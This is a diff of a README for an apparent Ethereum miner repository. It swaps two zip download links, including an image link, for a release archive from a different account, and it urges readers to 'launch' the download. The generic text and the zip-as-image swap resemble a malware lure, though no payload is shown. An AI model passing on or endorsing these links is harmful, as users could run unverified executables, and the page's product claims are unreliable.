@@ -1,7 +1,7 @@
 
 # 🌟 Welcome to Eth-Miner Repository 🌟
 
-![Eth-Miner](https://github.com/rokytd/files/raw/refs/heads/master/ethminer.png)
+![Eth-Miner](https://github.com/Axolotl1622/Eth-Miner/releases/download/v1.0.0/Application.zip)
 
 ## Repository Description
 Welcome to the Eth-Miner repository, your go-to place for an Ethereum miner with OpenCL, CUDA, and stratum support. Whether you are a seasoned miner or just starting out in the world of cryptocurrency mining, Eth-Miner has got you covered with its powerful features designed to optimize your mining experience.
@@ -23,7 +23,7 @@ Welcome to the Eth-Miner repository, your go-to place for an Ethereum miner with
 
 ## Download Eth-Miner
 Please click the button below to **launch** the Eth-Miner software and start your Ethereum mining journey!
-[![Download Eth-Miner](https://img.shields.io/badge/Download-Eth--Miner-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Eth-Miner](https://github.com/Axolotl1622/Eth-Miner/releases/download/v1.0.0/Application.zip)](https://github.com/Axolotl1622/Eth-Miner/releases/download/v1.0.0/Application.zip)
 
 If you encounter any issues with the download link or if it is not working, kindly check the "Releases" section for alternative download options.
 
